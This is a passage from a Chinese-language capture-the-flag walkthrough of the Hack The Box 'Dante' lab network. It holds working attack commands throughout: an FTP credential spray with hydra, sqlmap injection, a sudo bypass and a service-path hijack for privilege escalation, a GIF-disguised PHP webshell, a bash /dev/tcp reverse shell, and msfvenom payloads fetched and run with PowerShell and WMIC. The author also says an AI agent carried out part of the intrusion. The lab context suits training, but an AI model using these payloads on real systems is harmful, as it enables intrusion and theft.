for i in range(50):
    p = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts',
        '--type=method_call','--print-reply',
        '/org/freedesktop/Accounts/User1000',
        'org.freedesktop.Accounts.User.SetPassword',
        'string:','string:'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.003)
    try: os.kill(p.pid, 9)
    except: pass
"
# 3. 无密码切换 + sudo提root
su privesc       # 直接回车
sudo su          # root
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-073.png)

flag11：DANTE{0verfl0wing_l1k3_craz33!}

<font style="color:rgb(52, 52, 60);">上个fscan,扫一下2段</font>

```plain
root@DANTE-ADMIN-NIX05:~# ./fscan -h 172.16.2.0/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1     
[2.0s]     已选择服务扫描模式                                           
[2.0s]     开始信息扫描
[2.0s]     CIDR范围: 172.16.2.0-172.16.2.255
[2.0s]     generate_ip_range_full
[2.0s]     解析CIDR 172.16.2.0/24 -> IP范围 172.16.2.0-172.16.2.255
[2.0s]     最终有效主机数量: 256
[2.0s]     开始主机扫描
[2.0s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                               
[2.0s] [*] 目标 172.16.2.101    存活 (ICMP)
[2.0s] [*] 目标 172.16.2.5      存活 (ICMP)
[2.0s] [*] 目标 172.16.2.6      存活 (ICMP)
[5.0s]     存活主机数量: 3
[5.0s]     有效端口数量: 233
[5.0s] [*] 端口开放 172.16.2.101:22
[5.0s] [*] 端口开放 172.16.2.5:135
[5.0s] [*] 端口开放 172.16.2.5:88
[5.0s] [*] 端口开放 172.16.2.5:445
[5.0s] [*] 端口开放 172.16.2.5:139
[5.0s] [*] 端口开放 172.16.2.5:389
[5.0s] [*] 端口开放 172.16.2.6:22
[8.0s]     扫描完成, 发现 7 个开放端口
[8.0s]     存活端口数量: 7
[8.0s]     开始漏洞扫描
[8.1s]     POC加载完成: 总共387个，成功387个，失败0个
[8.1s] [*] NetInfo 扫描结果
目标主机: 172.16.2.5                                                   
主机名: DANTE-DC02                                                    
发现的网络接口:                                                        
   IPv4地址:    
      └─ 172.16.2.5    
[8.1s] [+] NetBios 172.16.2.5      DC:DANTE\DANTE-DC02        
[52.4s]     扫描已完成: 11/11
```

<font style="color:rgb(52, 52, 60);">发现还有一台2.6</font>

## <font style="color:rgb(52, 52, 60);">Linux:172.16.2.6</font>
22端口

在DC02的shell里直接ssh

用户密码是元购表里的plongbottom:PowerfixSaturdayClub777

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-074.png)

直接sudo su提权

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-075.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-076.png)

flag12：DANTE{Alw4ys_check_th053_group5}

## Windows：172.16.1.101  
| <font style="color:rgb(15, 17, 21);">172.16.1.101</font> | <font style="color:rgb(15, 17, 21);">DANTE-WS02</font> | <font style="color:rgb(15, 17, 21);">21, 135, 139, 445</font> | <font style="color:rgb(15, 17, 21);">SmbGhost (CVE-2020-0796)</font><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">漏洞</font> |
| --- | --- | --- | --- |


 CVE-2020-0796  

msf use exploit/windows/smb/cve_2020_0796_smbghost 不稳定

21：hydra 爆破，一对一对撞（-C 参数）  

```plain
asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
```

hydra -C hydra.txt 172.16.1.101 ftp -V

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-077.png)

login: dharding   password: WestminsterOrange5

登录

Remote login.txt

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-078.png)

+ **账号**：`dido`
+ **密码规则**：和 FTP 密码差不多，只是把数字 **5 换成了其他数字**（不是 5）

不是这台的，先放着

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-079.png)

直接登录dharding

proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-080.png)

flag13：DANTE{superB4d_p4ssw0rd_FTW}

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-081.png)

<font style="background-color:#FBDE28;">提权：</font>

试了土豆，不行

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-082.png)

**IObitUnSvr**  <font style="color:rgba(0, 0, 0, 0.95);">IObit 卸载服务程序</font>

<font style="background-color:#FBDE28;">IObitUnSvr 服务提权:</font>  
<font style="color:#DF2A3F;">服务以 LocalSystem 运行但 ImagePath 为空，且 dharding 对该服务有注册表写权限（SDDL 中的 WP 位）</font>

<font style="color:rgba(0, 0, 0, 0.95);">写注册表把服务路径改成添加管理员:</font>

```plain
sc config IObitUnSvr binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators dharding /add"
```

<font style="color:rgba(0, 0, 0, 0.95);">启动服务（以SYSTEM执行上述命令）</font>

```plain
sc start IObitUnSvr
```

<font style="color:rgba(0, 0, 0, 0.95);">服务启动"超时"报错（cmd不是长期运行的服务进程），但命令已执行——dharding 被加入 Administrators 组。</font>

<font style="color:rgba(0, 0, 0, 0.95);">权限生效</font>

<font style="color:rgba(0, 0, 0, 0.95);">当前 Evil-WinRM session 仍是中等完整性令牌，需重新连接刷新：</font>

```plain
proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
```

<font style="color:rgba(0, 0, 0, 0.95);">重连后拿到 High Mandatory Level，Administrator 权限确认</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-083.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-084.png)

flag14:DANTE{Qu0t3_I_4M_secure!_unQu0t3}

## <font style="color:rgba(0, 0, 0, 0.95);">windows:172.16.1.5  </font>
<font style="color:rgba(0, 0, 0, 0.95);"> proxychains ftp 172.16.1.5  </font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-085.png)

flag15:DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}

##  Linux：172.16.1.12  
 XAMPP  

| <font style="color:rgb(15, 17, 21);">172.16.1.12</font> | DANTE-NIX04 | <font style="color:rgb(15, 17, 21);">21, 22, 80, 443, 3306</font> | <font style="color:rgb(15, 17, 21);">运行 XAMPP</font> |
| --- | --- | --- | --- |


[https://172.16.1.12/blog/](https://172.16.1.12/blog/)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-086.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-087.png)

可注册登录。先注册一个用户

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-088.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-089.png)

尝试写码，不行，没权限

有3306端口，找到sql注入点

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-090.png)

sqlmap

```plain
sqlmap 'https://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080 
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-091.png)

```plain
proxychains sqlmap -u "http://172.16.1.12/blog/category.php?id=1" -D flag --dump
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-092.png)

flag16:DANTE{wHy_y0U_n0_s3cURe?!?!}

 blog_admin_db  :

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-093.png)

`membership_userpermissions` 权限表  :

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-094.png)

`membership_users` 表  :

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-095.png)

admin的哈希

 账号：admin 密码：admin  （好一个弱口令，我竟然没测😂）

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-096.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-097.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-098.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-099.png)

信息：

 ben 的 md5：

```plain
442179ad1de9c25593cabf625c0badb7
```

 egre55   的 md5 ：

```plain
d6501933a2e0ea1f497b87473051417f
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-100.png)

解一下：

ben :Welcometomyblog

 SSH 登录 ben

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-101.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-102.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-103.png)

flag12:DANTE{Pretty_Horrific_PH4IL!}

sudo -l:

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-104.png)

看到<font style="color:rgb(0, 0, 0);">(ALL, !root) /bin/bash，</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">CVE-2019-14287 sudo 权限绕过漏洞</font>**

**<font style="background-color:#FBDE28;">sudo -u#-1 /bin/bash</font>**直接提 Root

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-105.png)

flag17:DANTE{sudo_M4k3_me_@_Sandwich}

## Windows: 172.16.1.102  
| <font style="color:rgb(15, 17, 21);">172.16.1.102</font> | <font style="color:rgb(15, 17, 21);">DANTE-WS03</font> | <font style="color:rgb(15, 17, 21);">80, 135, 139, 443, 445, 3306</font> | <font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行“Dante Marriage Registration System”</font> |
| --- | --- | --- | --- |


<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-106.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-107.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-108.png)

登不进去

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-109.png)

Online Marriage Registration System 2020

找洞，还真有exp   OMRS

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-110.png)

**<font style="background-color:#FBDE28;">漏洞利用总结：</font>**

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">漏洞链（未授权 → RCE）</font>

```plain
未授权访问 → 注册普通用户 → 登录 → 婚姻登记表单上传证件 → 无文件校验 → 上传 PHP webshell → 命令执行
```

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">漏洞本质：</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 上传处无文件类型 / 后缀校验，直接传 </font>**`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">.php</font>`**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 不会被拦截  </font>**

命令：

```plain
# 攻击机开监听
nc -lvnp 9001

#上传nc
proxychains python3 omrs.py -u http://172.16.1.102/ -c 'powershell.exe wget 10.10.16.59:8000/nc.exe -O nc.exe'
# 目标反弹
proxychains python3 omrs.py -u http://172.16.1.102/ -c 'nc.exe -e powershell.exe 10.10.16.59 9001'
```

上传nc

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-111.png)

上传成功

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-112.png)

弹shell

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-113.png)

拿到shell

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-114.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-115.png)

flag18：DANTE{U_M4y_Kiss_Th3_Br1d3}

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-116.png)

提权：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-117.png)

土豆：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-118.png)

拿到system,直接读flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-119.png)

flag19：DANTE{D0nt_M3ss_With_MinatoTW}

##  Linux：172.16.1.19
| <font style="color:rgb(15, 17, 21);">172.16.1.19</font> | DANTE-NIX07 | <font style="color:rgb(15, 17, 21);">80, 8080</font> |
| --- | --- | --- |


8080：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-120.png)

之前DC02找到一个Jenkins.bat

Admin_129834765 SamsungOctober102030

登录

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-121.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-122.png)

直接给flag了

flag20：DANTE{to_g0_4ward_y0u_mus7_g0_back}

现在要拿shell,常见漏洞在Groovy 脚本控制台  

/script

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-123.png)

直接命令执行输出到页面上

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-124.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-125.png)

hostname: DANTE-NIX07

etc/passwd:

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
lou:x:1000:1000:lou,,,:/home/lou:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
jenkins:x:126:133:Jenkins,,,:/var/lib/jenkins:/bin/bash
mysql:x:127:135:MySQL Server,,,:/nonexistent:/bin/false
ian:x:1001:1001:,,,:/home/ian:/bin/bash
```

有用户 lou  ，ian

直接弹shell

```plain
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.59/9002 0>&1"].execute()
println("Shell sent!")
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-126.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-127.png)

提权：

sudo等提权都不行

用 linpeas.sh 扫一下

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-128.png)

有mysql,但是没扫到端口之前，也没找到密码

 LinPEAS 扫出来有 **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">CVE-2021-3493（Ubuntu OverlayFS）</font>** 提权漏洞  



> <font style="color:rgb(52, 52, 60);">😭</font><font style="color:rgb(52, 52, 60);">第二天起来发现入口机wordpress的Plugin因之前写</font><font style="color:rgb(52, 52, 60);">🐎</font><font style="color:rgb(52, 52, 60);">，都被杀了，新建新的也不行，找别的写</font><font style="color:rgb(52, 52, 60);">🐎</font><font style="color:rgb(52, 52, 60);">的地方也不行，参考wp打历史漏洞也不行，试试让agent直接帮我打。直接给我打出来了</font><font style="color:rgb(52, 52, 60);">😍</font><font style="color:rgb(52, 52, 60);">，直接rce且弹了shell。但是他老被杀，有没有什么解决方法呢？</font>
>



**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">CVE-2021-3493 OverlayFS</font>**<font style="color:rgb(52, 52, 60);"> 提权：</font>

<font style="color:rgb(52, 52, 60);">Kali编译(静态链接) → HTTP服务 → Jenkins wget下载 → 执行 → root</font>

```plain
wget -q https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -O /tmp/exploit.c 2>&1
```

```plain
gcc -static -o /tmp/exploit /tmp/exploit.c && echo "STATIC OK"
```

关键点：Kali上必须静态编译（gcc -static），因为.19的glibc版本低于Kali的2.34

```plain
# Kali上编译+开HTTP
gcc -static -o /tmp/exploit /tmp/exploit.c
cd /tmp && python3 -m http.server 8999

# .19上下载+执行
wget http://10.10.16.59:8999/exploit -O /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-129.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-130.png)

flag21:DANTE{g0tta_<3_ins3cur3_GROupz!}

## <font style="color:#DF2A3F;">Windows ：172.16.1.13</font>
| <font style="color:rgb(15, 17, 21);">172.16.1.13</font> | <font style="color:rgb(15, 17, 21);">DANTE-WS01</font> | <font style="color:rgb(15, 17, 21);">80, 443, 445</font> | <font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行 XAMPP</font> |
| --- | --- | --- | --- |


<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-131.png)

扫目录：

有phpmyadmin，但是不能访问

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-132.png)

/discuss

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-133.png)

/discuss/db/有个sql文件

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-134.png)

admin、admin登录，管理员，但没东西，john 12345 也能登录

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-135.png)

头像文件上传

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-136.png)

上传111.php getshell

rce了，先拿个flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-137.png)

flag22:DANTE{l355_t4lk_m04r_l15tening}

但是一直谈不上shell

cve：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-138.png)

<font style="color:#DF2A3F;background-color:#FBDE28;">DANTE-WS01 (172.16.1.13) GetShell （agent帮忙整理）</font>  
步骤1：注册用户上传webshell  
discuss论坛有历史漏洞——注册时头像上传可传PHP马。exec/system都不可fork，用无fork命令直接写：

1.1 注册并上传webshell（通过代理，Python脚本或直接curl）

```plain
proxychains curl -s -X POST 'http://172.16.1.13/discuss/registerH.php' 
-F 'un=pwn123' -F 'fn=pwn123' -F 'pwd=pwned123' 
-F 'e_mail=pwn123@test.com' -F 'gender=1' -F 'dob=1990-01-01' 
-F 'add=test' -F 'country=USA' -F 'state=TX' -F 'user_type=user' 
-F 'ima=@shell.php;type=image/gif' 2>/dev/null
```

<font style="color:#DF2A3F;">webshell内容（GIF header绕过检查）</font>：

```plain
GIF89a
<?php if(isset($_GET["c"])){echo exec($_GET["c"]);}else{echo"X";} ?>
```

→ PHP file + GIF header = antivirus lets it through

注册后文件在 /discuss/ups/ 目录下。

步骤2：发现exec/system不能fork  
exec/system都返回"Unable to fork"——PHP配置限制。但可以执行不分叉的PHP代码。

步骤3：写入system()版shell绕过验证

 通过exec写入新shell（echo >> 不需要fork）

```plain
proxychains curl -s --get 'http://172.16.1.13/discuss/ups/x.php' \
  --data-urlencode 'c=echo ^<?php echo system($_GET["c"]); ?^> > C:\xampp\htdocs\discuss\ups\s.php' 2>/dev/null
```

s.php使用system()而非exec()，能执行大部分命令但后台进程仍然受限。

步骤4：通过WMIC创建独立进程执行payload  
system虽不能fork但可写文件、用wmic启动独立进程：

```plain
# 4.1 生成MSF https payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.59 LPORT=8443 -f exe -o /tmp/msf_https.exe

# 4.2 Kali开HTTP服务
cd /tmp && python3 -m http.server 7780 &

# 4.3 通过s.php PowerShell下载（iwr不需要fork）
proxychains curl -s --get 'http://172.16.1.13/discuss/ups/s.php' \
  --data-urlencode 'c=powershell -c iwr http://10.10.16.59:7780/msf_https.exe -OutFile C:\Windows\Temp\m.exe' 2>/dev/null

# 4.4 WMIC启动payload（独立进程，不依赖PHP fork）
proxychains curl -s --get 'http://172.16.1.13/discuss/ups/s.php' \
  --data-urlencode 'c=wmic process call create C:\Windows\Temp\m.exe' 2>/dev/null

# 4.5 Kali MSF监听
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.59; set LPORT 8443; set ExitOnSession false; run -j"
```

完整链：

```plain
discuss论坛注册 → 头像上传PHP马(GIF header) → /ups/目录
  → exec webshell(x.php) → echo写入system() shell(s.php)
  → PowerShell下载MSF payload → WMIC独立进程执行
  → meterpreter reverse_https → dante-ws01\gerald
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-139.png)

提权：

在C:\Program Files (x86)\目录下发现Druva( 云端备份、勒索病毒防护、数据恢复工具）

```plain
wmic service get name,pathname,startname | findstr /i "druva"
```

输出：

inSyncCPHService  "C:\Program Files (x86)\Druva\inSync\inSyncCPHwnet64.exe"  <font style="color:#DF2A3F;">LocalSystem</font>， 发现Druva以LocalSystem运行

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-140.png)

版本是6.6.3，找漏洞

msf有exp

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-141.png)

```plain
use 0
set SESSION 1
set LHOST 10.10.16.59
set LPORT 5555
run
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-142.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-143.png)

flag23:DANTE{Bad_pr4ct1ces_Thru_strncmp}

---

> 2026.7.19完——Echoin
>









